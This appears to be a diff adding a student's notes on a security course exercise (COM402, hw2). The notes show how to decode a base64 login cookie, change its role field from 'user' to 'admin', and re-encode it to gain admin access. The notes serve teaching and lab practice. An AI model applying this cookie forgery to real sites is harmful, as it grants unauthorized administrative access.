@@ -1,0 +1,15 @@
+ex1 - login with any username (IAmAnAdmin), check cookie LoginCookie: 
+
+	SUFtQW5BZG1pbiwxNjAyMDc2NjEyLGNvbTQwMixodzIsZXgxLHVzZXI=
+
+	echo base64_hash_above | base64 -d
+
+Apply base64 -d and get IAmAnAdmin,1602076612,com402,hw2,ex1,user
+Change user at the end to admin and apply base64.
+There are problems with trailing \n so use
+
+	echo -n IAmAnAdmin,1602076612,com402,hw2,ex1,admin | base64
+
+Paste result in place of the old cookie, reload base and it works!
+
+	
